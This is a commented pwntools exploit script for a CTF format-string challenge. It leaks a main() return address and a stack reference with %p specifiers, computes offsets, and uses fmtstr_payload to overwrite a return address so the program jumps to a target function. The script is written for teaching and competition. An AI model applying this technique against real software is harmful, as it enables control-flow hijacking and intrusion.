# I wrote this script, utilizing the library Pwntools, to solve a format string vulnerability challenge for a CTF in 2025.
# For the challenge, the program was hosted on a remote server, where it could access a file with the flag.
# But they also provided the C++ source code and the compiled Program.
# See README for more info.
# -- Andrew Rucks

from pwn import *

p = process('[PATH TO PROGRAM]')
context.bits = 64
context.arch = 'amd64'

# waits for the Program to output a line, and prints it to console. 
info(p.recvline())

# get main() address in hex.
# this can be discovered by debugging the compiled Program, and looking for return addresses in the stack.
# in this case, there is a return address to main() 27 spaces down the stack.
p.sendline("%27$p")

# main address reply wil be in hexadecimal format. 
maddr = p.recvline()
info(maddr)

# converts hex to int
maddr = int(maddr, 16)

# calculate targetfunction() address. In this case, from analyzing the .text section of the Program, it is offset -408 from main()
tfaddr = maddr - 408

# now we need to find an address of a stack item, since the .text section and the stack are separate in memory and will always have different offsets from each other.
# it needs to be in the same position every time: in this case 22 down the stack.
# this can be determined using a debugger.
# the "reference address":
p.sendline("%22$p")
refaddr = p.recvline()
info(refaddr)
refaddr = int(refaddr, 16)

# calculate the actual location of the return address (to main()) on the stack using the reference address and a constant offset.
# once again, calculateable with a debugger.
returnaddr = refaddr - 168

# now, we have the actual address of the targetfunction(), and the address, in stack memory, of a Return.
# write targetfunction() address to the return address
# note: "6" is the offset from the top of the stack to where the input buffer begins, in this case.
write = {returnaddr: tfaddr}
payload = fmtstr_payload(6, write, write_size='short')

# sends the format string payload
p.sendline(payload)
 
# if all is set up properly, this should cause the Program to execute the targetfunction().
# here, the input "exit" causes the program to return to the address that we have overwritten with the address of targetfunction().
p.sendline("exit")

# DISCLAIMER: THIS IS FOR EDUCATIONAL / CAPTURE THE FLAG PURPOSES ONLY.